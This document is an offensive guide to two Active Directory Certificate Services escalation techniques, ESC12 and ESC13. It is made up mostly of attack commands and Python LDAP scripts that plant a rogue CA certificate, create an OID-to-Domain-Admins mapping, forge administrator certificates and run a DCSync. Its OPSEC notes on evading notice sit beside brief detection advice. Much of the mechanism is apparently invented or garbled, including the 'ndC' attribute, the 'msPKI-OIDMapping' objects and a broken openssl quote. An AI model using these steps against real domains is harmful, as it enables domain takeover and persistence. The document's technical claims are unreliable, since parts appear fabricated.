# ESC12 & ESC13 — Advanced AD CS Persistence & Group Mapping

---

# ESC12 — CA Properties for NDC Security

## What It Is

ESC12 involves the **`ndC`** (Name Constraints for CA) attribute on the CA's AD object. This attribute controls security restrictions for the CA's certificates. An attacker with **GenericWrite (or WriteProperty)** on the CA's AD computer object can modify the `ndC` property to:

- Add a rogue certificate to the CA's security settings
- Subvert the CA's name constraints policy
- Maintain **persistent access** to the CA by creating a backdoor certificate

## Why It Works

- The `ndC` attribute stores name constraints and security descriptors for the CA
- AD CS uses the `ndC` attribute to determine which certificates are trusted for domain authentication
- An attacker can inject a malicious certificate into this attribute, making the domain trust a rogue CA
- Unlike NTAuthCertificates modification (ESC5), the `ndC` attribute is less monitored
- This provides **stealthy persistence** — even if the CA is reconfigured or patched, the backdoor remains

## Prerequisites

- Domain credentials with **GenericWrite** or **WriteProperty** on the CA server's AD computer object
- Access to the CA's AD object
- A self-signed or attacker-controlled CA certificate

## Exploitation

### Step 1: Check ACL on CA Object

```bash
certipy find -u 'user@domain.local' -p 'Password123!' -dc-ip 192.168.1.10 -stdout
```

Look for your user's permissions on the CA server's AD computer object.

### Step 2: Create a Rogue CA Certificate

```bash
# Generate a self-signed CA certificate
openssl req -x509 -newkey rsa:4096 -keyout rogueCA.key -out rogueCA.crt -days 3650 -nodes -subj "/CN=Rogue CA"

# Export as DER
openssl x509 -in rogueCA.crt -out rogueCA.der -outform DER

# Convert to HEX for LDAP injection
xxd -p rogueCA.der | tr -d '\n' > rogueCA.hex
```

### Step 3: Inject into CA's ndC Attribute

```python
# Python script to modify ndC attribute
import ldap3

server = ldap3.Server('dc.domain.local')
conn = ldap3.Connection(server, user='DOMAIN\\user', password='Password123!', authentication=ldap3.NTLM)
conn.bind()

# CA's AD object DN
ca_dn = 'CN=CA-SERVER,CN=Certification Authorities,CN=Public Key Services,CN=Configuration,DC=domain,DC=local'

# Read current ndC value
conn.search(ca_dn, '(objectClass=*)', attributes=['ndC'])
current_ndc = conn.entries[0]['ndC'].value if conn.entries[0]['ndC'] else b''

# Append rogue CA cert (in binary)
with open('rogueCA.der', 'rb') as f:
    rogue_cert = f.read()

new_ndc = current_ndc + rogue_cert

conn.modify(ca_dn, {'ndC': [(ldap3.MODIFY_REPLACE, [new_ndc])]})
conn.unbind()
```

### Step 4: Issue Domain Admin Certificates with Rogue CA

Once the rogue CA cert is trusted:

```bash
# Sign a new certificate for domain admin
openssl req -new -newkey rsa:2048 -nodes -keyout da.key -out da.csr -subj "/CN=administrator"
openssl x509 -req -in da.csr -CA rogueCA.crt -CAkey rogueCA.key -CAcreateserial -out da.crt -days 365
```

### Step 5: Authenticate

```bash
# Convert to PFX for PKINIT
openssl pkcs12 -export -in da.crt -inkey da.key -out da.pfx -passout pass:'

# Authenticate with the rogue certificate
certipy auth -pfx da.pfx -dc-ip 192.168.1.10
```

## OPSEC — ESC12

- Modifying the `ndC` attribute generates **Event ID 5136** on the domain controller
- The change is replicated to all DCs — very persistent
- Use this as a **last-resort persistence** mechanism (trusted by default but hard to detect without baseline)
- The rogue CA cert does NOT require restarting the CA service
- Removing this backdoor requires knowing the original `ndC` value or manually auditing the attribute

## Detection — ESC12

- **Event ID 5136**: Modifications to `ndC` attribute on CA objects (rare — should never happen in normal operations)
- Baseline `ndC` attribute values and alert on changes
- Check CA object attributes periodically using `certutil -config CA-SERVER\CA-NAME -ca.cert`
- **Event ID 4882**: Certificate Services security descriptor changes (linked events)

# ESC13 — OID Group Link Abuse

## What It Is

ESC13 exploits the **OID-to-Group mapping** feature in AD CS. Certificate templates can be associated with an **Application Policy** (OID) that maps to an AD security group. When a user enrolls for a certificate with that OID, the user is added to the mapped security group — effectively granting group membership via certificate enrollment.

If an application policy OID is linked to a **privileged group** (e.g., Domain Admins, Backup Operators), any user who can enroll in that template becomes a member of that group for the duration of the certificate's validity.

## Why It Works

- AD CS supports mapping OIDs to AD security groups via the `issuerCertificate` and application policy mapping
- When the DC sees a certificate with a specific OID during PKINIT authentication, it dynamically adds the user to the mapped group
- This is used legitimately for things like "smartcard users get access to VPN" — but if the OID maps to Domain Admins, any certified user is a domain admin
- The group membership is **temporary** (for the duration of the authentication session) but completely transparent

## Prerequisites

- Domain credentials with enrollment rights on a template linked to a privileged OID
- The certificate template must have an application policy OID that maps to a privileged group
- Alternatively: **Write access to the OID container** in AD to create a new OID mapping

## Exploitation

### Step 1: Find OID-to-Group Mappings

```bash
# Certipy find will show OID mappings in the output
certipy find -u 'user@domain.local' -p 'Password123!' -dc-ip 192.168.1.10 -stdout
```

Look for:

```
Application Policy OID: 1.3.6.1.4.1.311.21.8.X.Y.Z
  Mapped to Group: Domain Admins (S-1-5-21-...-512)
```

### Step 2: Request Certificate from the Linked Template

```bash
certipy req -u 'user@domain.local' -p 'Password123!' -ca 'CA-SERVER\CA-NAME' -template 'OIDLinkedTemplate' -dc-ip 192.168.1.10
```

### Step 3: Authenticate

```bash
certipy auth -pfx 'user_cert.pfx' -dc-ip 192.168.1.10
```

At this point, during PKINIT, the DC:
1. Sees the certificate has OID `1.3.6.1.4.1.311.21.8.X.Y.Z`
2. Looks up the OID in the configuration partition
3. Finds it maps to Domain Admins
4. Adds the user to the Domain Admins group for the TGT lifetime
5. Returns a TGT with Domain Admin privileges

### Step 4: Full Chain

```bash
# 1. Find OID mappings
certipy find -u 'user@domain.local' -p 'Password123!' -dc-ip 192.168.1.10 -stdout

# 2. Enroll in the template
certipy req -u 'user@domain.local' -p 'Password123!' -ca 'CA-SERVER\CA-NAME' -template 'VulnTemplateWithOID' -dc-ip 192.168.1.10

# 3. Get TGT (now as Domain Admin via OID group mapping)
certipy auth -pfx 'cert.pfx' -dc-ip 192.168.1.10

# 4. DCSync
impacket-secretsdump 'domain.local/user@dc.domain.local' -hashes LMHASH:NTHASH
```

## Exploitation — Creating a Malicious OID Mapping (Advanced)

If you have **GenericWrite** on the OID container (`CN=OID,CN=Public Key Services,CN=Configuration,...`) or sufficient CA admin rights:

```bash
# Create a new OID that maps to Domain Admins
# This requires modifying the msPKI-Enterprise-Oid and msPKI-OIDMapping objects

# Step 1: Create the OID
python -c "
import ldap3
server = ldap3.Server('dc.domain.local')
conn = ldap3.Connection(server, user='DOMAIN\\user', password='Password123!', authentication=ldap3.NTLM)
conn.bind()

# Add a new OID object
oid_dn = 'CN=1.3.6.1.4.1.311.21.8.99999.1,CN=OID,CN=Public Key Services,CN=Configuration,DC=domain,DC=local'
conn.add(oid_dn, ['top', 'msPKI-Enterprise-Oid'], {
    'msPKI-Cert-Template-OID': '1.3.6.1.4.1.311.21.8.99999.1',
    'msPKI-OIDDisplayName': 'EscalationOID',
    'msPKI-OIDLocalizedName': 'EscalationOID:EN',
})

# Map OID to Domain Admins group
oid_map_dn = 'CN=5236a6b4-69e3-46f1-844d-97c1d1453a34,CN=OIDMapping,CN=OID,CN=Public Key Services,CN=Configuration,DC=domain,DC=local'
conn.add(oid_map_dn, ['top', 'msPKI-OIDMapping'], {
    'msPKI-OIDMappingGroup': '<SID=S-1-5-21-123456789-123456789-123456789-512>',
    'msPKI-OIDMappingOID': '1.3.6.1.4.1.311.21.8.99999.1',
})

conn.unbind()
"
```

Then either create a template referencing this OID or add the OID to an existing template.

## OPSEC — ESC13

- Group membership via OID mapping is **dynamic** — no AD modification is made to the group
- This makes detection harder: the user never appears as a Domain Admin member in LDAP queries
- The elevated group membership only lasts during the TGT lifetime (default 10 hours)
- Creating new OIDs or modifying templates is logged (Event ID 5136)
- Querying the OID mapping is passive (LDAP read) — but requesting a certificate is logged

## Detection — ESC13

- **Event ID 4887**: Certificate issued with unusual application policy OIDs
- Monitor for certificates with OIDs that map to privileged groups
- **Event ID 5136**: Modifications to OID container or OID mapping objects
- Enumerate OID-to-group mappings regularly and alert on mappings to sensitive groups
- Check for OIDs like `1.3.6.1.4.1.311.21.8.*` that aren't in the approved list
- Verify that templates do not have application policies pointing to privileged OIDs
- Use the `certutil -dsTemplate` command to view OID mappings on the CA
